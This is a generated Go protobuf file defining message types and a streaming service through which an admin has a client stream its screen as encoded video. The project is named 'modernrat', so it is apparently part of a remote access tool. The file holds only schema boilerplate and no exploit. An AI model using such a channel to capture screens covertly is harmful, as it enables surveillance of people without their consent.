// Code generated by protoc-gen-go. DO NOT EDIT.
// versions:
// 	protoc-gen-go v1.36.10
// 	protoc        v3.12.4
// source: screen_capture.proto

package proto

import (
	protoreflect "google.golang.org/protobuf/reflect/protoreflect"
	protoimpl "google.golang.org/protobuf/runtime/protoimpl"
	reflect "reflect"
	sync "sync"
	unsafe "unsafe"
)

const (
	// Verify that this generated code is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion)
	// Verify that runtime/protoimpl is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20)
)

// Message types for screen capture control and data flow.
type ScreenCaptureMessageType int32

const (
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_UNSPECIFIED ScreenCaptureMessageType = 0
	// Client -> Server: announce availability for screen capture.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER ScreenCaptureMessageType = 1
	// Server -> Client: acknowledge registration.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED ScreenCaptureMessageType = 2
	// Admin -> Server -> Client: request to start a capture session.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_START ScreenCaptureMessageType = 3
	// Admin -> Server -> Client: request to stop an active capture session.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP ScreenCaptureMessageType = 4
	// Client -> Server -> Admin: indicate capture pipeline is ready.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_READY ScreenCaptureMessageType = 5
	// Client -> Server -> Admin: deliver encoded video data.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_DATA ScreenCaptureMessageType = 6
	// Either direction: report a terminal condition for the session.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE ScreenCaptureMessageType = 7
	// Either direction: report an error condition.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR ScreenCaptureMessageType = 8
	// Either direction: heartbeat to keep the stream alive.
	ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT ScreenCaptureMessageType = 9
)

// Enum value maps for ScreenCaptureMessageType.
var (
	ScreenCaptureMessageType_name = map[int32]string{
		0: "SCREEN_CAPTURE_MESSAGE_TYPE_UNSPECIFIED",
		1: "SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER",
		2: "SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED",
		3: "SCREEN_CAPTURE_MESSAGE_TYPE_START",
		4: "SCREEN_CAPTURE_MESSAGE_TYPE_STOP",
		5: "SCREEN_CAPTURE_MESSAGE_TYPE_READY",
		6: "SCREEN_CAPTURE_MESSAGE_TYPE_DATA",
		7: "SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE",
		8: "SCREEN_CAPTURE_MESSAGE_TYPE_ERROR",
		9: "SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT",
	}
	ScreenCaptureMessageType_value = map[string]int32{
		"SCREEN_CAPTURE_MESSAGE_TYPE_UNSPECIFIED": 0,
		"SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER":    1,
		"SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED":  2,
		"SCREEN_CAPTURE_MESSAGE_TYPE_START":       3,
		"SCREEN_CAPTURE_MESSAGE_TYPE_STOP":        4,
		"SCREEN_CAPTURE_MESSAGE_TYPE_READY":       5,
		"SCREEN_CAPTURE_MESSAGE_TYPE_DATA":        6,
		"SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE":    7,
		"SCREEN_CAPTURE_MESSAGE_TYPE_ERROR":       8,
		"SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT":   9,
	}
)

func (x ScreenCaptureMessageType) Enum() *ScreenCaptureMessageType {
	p := new(ScreenCaptureMessageType)
	*p = x
	return p
}

func (x ScreenCaptureMessageType) String() string {
	return protoimpl.X.EnumStringOf(x.Descriptor(), protoreflect.EnumNumber(x))
}

func (ScreenCaptureMessageType) Descriptor() protoreflect.EnumDescriptor {
	return file_screen_capture_proto_enumTypes[0].Descriptor()
}

func (ScreenCaptureMessageType) Type() protoreflect.EnumType {
	return &file_screen_capture_proto_enumTypes[0]
}

func (x ScreenCaptureMessageType) Number() protoreflect.EnumNumber {
	return protoreflect.EnumNumber(x)
}

// Deprecated: Use ScreenCaptureMessageType.Descriptor instead.
func (ScreenCaptureMessageType) EnumDescriptor() ([]byte, []int) {
	return file_screen_capture_proto_rawDescGZIP(), []int{0}
}

// Desired encoder configuration for a capture session.
type CaptureSettings struct {
	state protoimpl.MessageState `protogen:"open.v1"`
	// MIME type of the encoded payload (e.g. "video/mp2t").
	Format string `protobuf:"bytes,1,opt,name=format,proto3" json:"format,omitempty"`
	// Encoder name (e.g. "libx264", "h264_nvenc").
	Encoder string `protobuf:"bytes,2,opt,name=encoder,proto3" json:"encoder,omitempty"`
	// Desired capture width; 0 preserves native width.
	Width int32 `protobuf:"varint,3,opt,name=width,proto3" json:"width,omitempty"`
	// Desired capture height; 0 preserves native height.
	Height int32 `protobuf:"varint,4,opt,name=height,proto3" json:"height,omitempty"`
	// Target frame rate; 0 uses encoder default.
	Framerate int32 `protobuf:"varint,5,opt,name=framerate,proto3" json:"framerate,omitempty"`
	// Target bitrate in kbps; 0 lets the encoder decide.
	BitrateKbps int32 `protobuf:"varint,6,opt,name=bitrate_kbps,json=bitrateKbps,proto3" json:"bitrate_kbps,omitempty"`
	// Keyframe interval in frames; 0 uses encoder default.
	KeyframeInterval int32 `protobuf:"varint,7,opt,name=keyframe_interval,json=keyframeInterval,proto3" json:"keyframe_interval,omitempty"`
	// Optional capture source override (e.g. X11 display, monitor id).
	CaptureSource string `protobuf:"bytes,8,opt,name=capture_source,json=captureSource,proto3" json:"capture_source,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CaptureSettings) Reset() {
	*x = CaptureSettings{}
	mi := &file_screen_capture_proto_msgTypes[0]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CaptureSettings) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CaptureSettings) ProtoMessage() {}

func (x *CaptureSettings) ProtoReflect() protoreflect.Message {
	mi := &file_screen_capture_proto_msgTypes[0]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CaptureSettings.ProtoReflect.Descriptor instead.
func (*CaptureSettings) Descriptor() ([]byte, []int) {
	return file_screen_capture_proto_rawDescGZIP(), []int{0}
}

func (x *CaptureSettings) GetFormat() string {
	if x != nil {
		return x.Format
	}
	return ""
}

func (x *CaptureSettings) GetEncoder() string {
	if x != nil {
		return x.Encoder
	}
	return ""
}

func (x *CaptureSettings) GetWidth() int32 {
	if x != nil {
		return x.Width
	}
	return 0
}

func (x *CaptureSettings) GetHeight() int32 {
	if x != nil {
		return x.Height
	}
	return 0
}

func (x *CaptureSettings) GetFramerate() int32 {
	if x != nil {
		return x.Framerate
	}
	return 0
}

func (x *CaptureSettings) GetBitrateKbps() int32 {
	if x != nil {
		return x.BitrateKbps
	}
	return 0
}

func (x *CaptureSettings) GetKeyframeInterval() int32 {
	if x != nil {
		return x.KeyframeInterval
	}
	return 0
}

func (x *CaptureSettings) GetCaptureSource() string {
	if x != nil {
		return x.CaptureSource
	}
	return ""
}

// Message exchanged between admin, server, and client for screen capture.
type ScreenCaptureMessage struct {
	state protoimpl.MessageState `protogen:"open.v1"`
	// Session identifier assigned by the server.
	SessionId string `protobuf:"bytes,1,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
	// User identifier associated with the capture request.
	UserId string                   `protobuf:"bytes,2,opt,name=user_id,json=userId,proto3" json:"user_id,omitempty"`
	Type   ScreenCaptureMessageType `protobuf:"varint,3,opt,name=type,proto3,enum=modernrat.ScreenCaptureMessageType" json:"type,omitempty"`
	// Encoded video payload for DATA messages.
	Data []byte `protobuf:"bytes,4,opt,name=data,proto3" json:"data,omitempty"`
	// Optional human readable text (status, errors, metadata).
	Text string `protobuf:"bytes,5,opt,name=text,proto3" json:"text,omitempty"`
	// Unix timestamp for the event.
	Timestamp int64 `protobuf:"varint,6,opt,name=timestamp,proto3" json:"timestamp,omitempty"`
	// Capture settings requested or negotiated for the session.
	Settings *CaptureSettings `protobuf:"bytes,7,opt,name=settings,proto3" json:"settings,omitempty"`
	// Client-assigned correlation identifier for request/response.
	RequestId     string `protobuf:"bytes,8,opt,name=request_id,json=requestId,proto3" json:"request_id,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *ScreenCaptureMessage) Reset() {
	*x = ScreenCaptureMessage{}
	mi := &file_screen_capture_proto_msgTypes[1]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *ScreenCaptureMessage) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ScreenCaptureMessage) ProtoMessage() {}

func (x *ScreenCaptureMessage) ProtoReflect() protoreflect.Message {
	mi := &file_screen_capture_proto_msgTypes[1]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ScreenCaptureMessage.ProtoReflect.Descriptor instead.
func (*ScreenCaptureMessage) Descriptor() ([]byte, []int) {
	return file_screen_capture_proto_rawDescGZIP(), []int{1}
}

func (x *ScreenCaptureMessage) GetSessionId() string {
	if x != nil {
		return x.SessionId
	}
	return ""
}

func (x *ScreenCaptureMessage) GetUserId() string {
	if x != nil {
		return x.UserId
	}
	return ""
}

func (x *ScreenCaptureMessage) GetType() ScreenCaptureMessageType {
	if x != nil {
		return x.Type
	}
	return ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_UNSPECIFIED
}

func (x *ScreenCaptureMessage) GetData() []byte {
	if x != nil {
		return x.Data
	}
	return nil
}

func (x *ScreenCaptureMessage) GetText() string {
	if x != nil {
		return x.Text
	}
	return ""
}

func (x *ScreenCaptureMessage) GetTimestamp() int64 {
	if x != nil {
		return x.Timestamp
	}
	return 0
}

func (x *ScreenCaptureMessage) GetSettings() *CaptureSettings {
	if x != nil {
		return x.Settings
	}
	return nil
}

func (x *ScreenCaptureMessage) GetRequestId() string {
	if x != nil {
		return x.RequestId
	}
	return ""
}

var File_screen_capture_proto protoreflect.FileDescriptor

const file_screen_capture_proto_rawDesc = "" +
	"\n" +
	"\x14screen_capture.proto\x12\tmodernrat\"\x86\x02\n" +
	"\x0fCaptureSettings\x12\x16\n" +
	"\x06format\x18\x01 \x01(\tR\x06format\x12\x18\n" +
	"\aencoder\x18\x02 \x01(\tR\aencoder\x12\x14\n" +
	"\x05width\x18\x03 \x01(\x05R\x05width\x12\x16\n" +
	"\x06height\x18\x04 \x01(\x05R\x06height\x12\x1c\n" +
	"\tframerate\x18\x05 \x01(\x05R\tframerate\x12!\n" +
	"\fbitrate_kbps\x18\x06 \x01(\x05R\vbitrateKbps\x12+\n" +
	"\x11keyframe_interval\x18\a \x01(\x05R\x10keyframeInterval\x12%\n" +
	"\x0ecapture_source\x18\b \x01(\tR\rcaptureSource\"\xa4\x02\n" +
	"\x14ScreenCaptureMessage\x12\x1d\n" +
	"\n" +
	"session_id\x18\x01 \x01(\tR\tsessionId\x12\x17\n" +
	"\auser_id\x18\x02 \x01(\tR\x06userId\x127\n" +
	"\x04type\x18\x03 \x01(\x0e2#.modernrat.ScreenCaptureMessageTypeR\x04type\x12\x12\n" +
	"\x04data\x18\x04 \x01(\fR\x04data\x12\x12\n" +
	"\x04text\x18\x05 \x01(\tR\x04text\x12\x1c\n" +
	"\ttimestamp\x18\x06 \x01(\x03R\ttimestamp\x126\n" +
	"\bsettings\x18\a \x01(\v2\x1a.modernrat.CaptureSettingsR\bsettings\x12\x1d\n" +
	"\n" +
	"request_id\x18\b \x01(\tR\trequestId*\xb3\x03\n" +
	"\x18ScreenCaptureMessageType\x12+\n" +
	"'SCREEN_CAPTURE_MESSAGE_TYPE_UNSPECIFIED\x10\x00\x12(\n" +
	"$SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER\x10\x01\x12*\n" +
	"&SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED\x10\x02\x12%\n" +
	"!SCREEN_CAPTURE_MESSAGE_TYPE_START\x10\x03\x12$\n" +
	" SCREEN_CAPTURE_MESSAGE_TYPE_STOP\x10\x04\x12%\n" +
	"!SCREEN_CAPTURE_MESSAGE_TYPE_READY\x10\x05\x12$\n" +
	" SCREEN_CAPTURE_MESSAGE_TYPE_DATA\x10\x06\x12(\n" +
	"$SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE\x10\a\x12%\n" +
	"!SCREEN_CAPTURE_MESSAGE_TYPE_ERROR\x10\b\x12)\n" +
	"%SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT\x10\t2\xc3\x01\n" +
	"\x14ScreenCaptureService\x12T\n" +
	"\fAdminCapture\x12\x1f.modernrat.ScreenCaptureMessage\x1a\x1f.modernrat.ScreenCaptureMessage(\x010\x01\x12U\n" +
	"\rClientCapture\x12\x1f.modernrat.ScreenCaptureMessage\x1a\x1f.modernrat.ScreenCaptureMessage(\x010\x01B\x1cZ\x1agithub.com/modernrat/protob\x06proto3"

var (
	file_screen_capture_proto_rawDescOnce sync.Once
	file_screen_capture_proto_rawDescData []byte
)

func file_screen_capture_proto_rawDescGZIP() []byte {
	file_screen_capture_proto_rawDescOnce.Do(func() {
		file_screen_capture_proto_rawDescData = protoimpl.X.CompressGZIP(unsafe.Slice(unsafe.StringData(file_screen_capture_proto_rawDesc), len(file_screen_capture_proto_rawDesc)))
	})
	return file_screen_capture_proto_rawDescData
}

var file_screen_capture_proto_enumTypes = make([]protoimpl.EnumInfo, 1)
var file_screen_capture_proto_msgTypes = make([]protoimpl.MessageInfo, 2)
var file_screen_capture_proto_goTypes = []any{
	(ScreenCaptureMessageType)(0), // 0: modernrat.ScreenCaptureMessageType
	(*CaptureSettings)(nil),       // 1: modernrat.CaptureSettings
	(*ScreenCaptureMessage)(nil),  // 2: modernrat.ScreenCaptureMessage
}
var file_screen_capture_proto_depIdxs = []int32{
	0, // 0: modernrat.ScreenCaptureMessage.type:type_name -> modernrat.ScreenCaptureMessageType
	1, // 1: modernrat.ScreenCaptureMessage.settings:type_name -> modernrat.CaptureSettings
	2, // 2: modernrat.ScreenCaptureService.AdminCapture:input_type -> modernrat.ScreenCaptureMessage
	2, // 3: modernrat.ScreenCaptureService.ClientCapture:input_type -> modernrat.ScreenCaptureMessage
	2, // 4: modernrat.ScreenCaptureService.AdminCapture:output_type -> modernrat.ScreenCaptureMessage
	2, // 5: modernrat.ScreenCaptureService.ClientCapture:output_type -> modernrat.ScreenCaptureMessage
	4, // [4:6] is the sub-list for method output_type
	2, // [2:4] is the sub-list for method input_type
	2, // [2:2] is the sub-list for extension type_name
	2, // [2:2] is the sub-list for extension extendee
	0, // [0:2] is the sub-list for field type_name
}

func init() { file_screen_capture_proto_init() }
func file_screen_capture_proto_init() {
	if File_screen_capture_proto != nil {
		return
	}
	type x struct{}
	out := protoimpl.TypeBuilder{
		File: protoimpl.DescBuilder{
			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
			RawDescriptor: unsafe.Slice(unsafe.StringData(file_screen_capture_proto_rawDesc), len(file_screen_capture_proto_rawDesc)),
			NumEnums:      1,
			NumMessages:   2,
			NumExtensions: 0,
			NumServices:   1,
		},
		GoTypes:           file_screen_capture_proto_goTypes,
		DependencyIndexes: file_screen_capture_proto_depIdxs,
		EnumInfos:         file_screen_capture_proto_enumTypes,
		MessageInfos:      file_screen_capture_proto_msgTypes,
	}.Build()
	File_screen_capture_proto = out.File
	file_screen_capture_proto_goTypes = nil
	file_screen_capture_proto_depIdxs = nil
}
